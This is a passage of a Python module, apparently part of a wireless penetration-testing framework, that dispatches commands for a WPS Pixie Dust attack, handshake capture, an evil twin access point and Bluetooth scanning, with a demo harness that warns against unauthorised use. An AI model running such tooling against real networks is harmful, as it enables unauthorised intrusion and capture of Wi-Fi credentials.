                    result = await self.manager.wps_attack.pixie_dust_attack(target)
                    return {"success": True, "data": asdict(result)}
                else:
                    return {"success": False, "error": "Invalid target index"}
            
            elif command == "capture_handshake":
                target_index = parameters.get('target_index', 0)
                timeout = parameters.get('timeout', 300)
                if target_index < len(self.manager.scanner.networks):
                    target = self.manager.scanner.networks[target_index]
                    result = await self.manager.handshake_capture.capture_handshake(target, timeout)
                    return {"success": True, "data": asdict(result)}
                else:
                    return {"success": False, "error": "Invalid target index"}
            
            elif command == "evil_twin":
                target_index = parameters.get('target_index', 0)
                duration = parameters.get('duration', 300)
                if target_index < len(self.manager.scanner.networks):
                    target = self.manager.scanner.networks[target_index]
                    result = await self.manager.evil_twin.create_evil_twin(target, duration)
                    return {"success": True, "data": asdict(result)}
                else:
                    return {"success": False, "error": "Invalid target index"}
            
            elif command == "scan_bluetooth":
                duration = parameters.get('duration', 30)
                devices = await self.manager.bluetooth_scanner.scan_bluetooth_devices(duration)
                return {"success": True, "data": {"devices": devices}}
            
            elif command == "generate_report":
                report = self.manager.generate_report()
                return {"success": True, "data": {"report": report}}
            
            else:
                return {"success": False, "error": f"Unknown command: {command}"}
                
        except Exception as e:
            logger.error(f"命令執行失敗: {e}")
            return {"success": False, "error": str(e)}
    
    async def cleanup(self) -> bool:
        """清理資源"""
        try:
            if self.manager:
                # 停用監控模式
                if self.manager.scanner.is_monitoring:
                    await self.manager.scanner.disable_monitor_mode()
                
                # 停止惡意 AP
                await self.manager.evil_twin._stop_evil_twin()
                
                # 清理攻擊結果
                self.manager.attack_results.clear()
            
            return True
            
        except Exception as e:
            logger.error(f"清理失敗: {e}")
            return False


# 註冊能力
CapabilityRegistry.register("wireless_attack_tools", WirelessCapability)


if __name__ == "__main__":
    # 測試用例
    async def test_wireless_tools():
        capability = WirelessCapability()
        await capability.initialize()
        
        console.print("[bold red]⚠️  這只是演示，請勿對未授權目標執行實際攻擊！[/bold red]")
        
        # 啟動互動式選單
        if capability.manager:
            await capability.manager.interactive_menu()
        
        await capability.cleanup()
    
    # 運行測試
    asyncio.run(test_wireless_tools())